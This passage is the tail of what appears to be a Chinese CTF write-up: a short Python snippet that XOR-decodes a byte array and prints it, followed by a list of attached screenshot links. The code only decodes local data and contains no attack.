for i in range(0,10,2):
    a[i]^=a[i+1]
for i in range(1,11,2):
    a[i]^=i
print(bytes(a))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/0-1641893392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/2-1641893392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/6-1641893392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/8-1641893392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/7-1641893392.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/8-1641893393.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/10-1641893393.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/10-1641893393-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/1-1641893393.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/01/4-1641893393.png)